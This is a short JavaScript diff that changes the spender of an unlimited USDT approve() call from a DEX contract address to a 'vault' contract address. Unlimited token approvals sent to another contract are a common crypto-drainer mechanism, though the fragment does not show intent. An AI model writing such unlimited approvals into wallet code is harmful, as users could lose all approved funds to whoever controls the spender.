@@ -1615,7 +1615,7 @@ async function requestUSDTAllowance(userAddress) {
         const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
         const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
-        const tx = await usdtContract.approve(dexContractAddress, ethers.MaxUint256);
+        const tx = await usdtContract.approve(vaultContractAddress, ethers.MaxUint256);
         
         // This line waits for the block to be mined
         await tx.wait(); 
